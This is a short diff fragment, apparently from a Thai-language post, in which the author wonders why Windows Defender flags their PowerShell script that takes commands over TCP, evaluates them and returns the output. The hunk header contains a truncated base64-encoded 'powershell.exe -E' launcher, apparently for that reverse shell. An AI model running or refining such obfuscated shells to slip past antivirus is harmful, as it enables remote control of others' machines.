@@ -89,3 +89,4 @@ powershell.exe -E JABhAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAH
 1. คุณ Windows Defender จะ Detect ทำไมกับโปรแกรมรับข้อความจาก TCP มา Eval แล้วส่งกลับ
 2. คุณ Windows Defender จะ Detect จาก `(pwd).Path` ไม่ได้นะครับ มันไม่ได้เป็นสาระสำคัญของ Script เลย
 3. อะไรกันคับเนี่ย คุณ Windows Defender คุณคิดอะไรอยู่ ผมงงไปหมดแล้ว
+
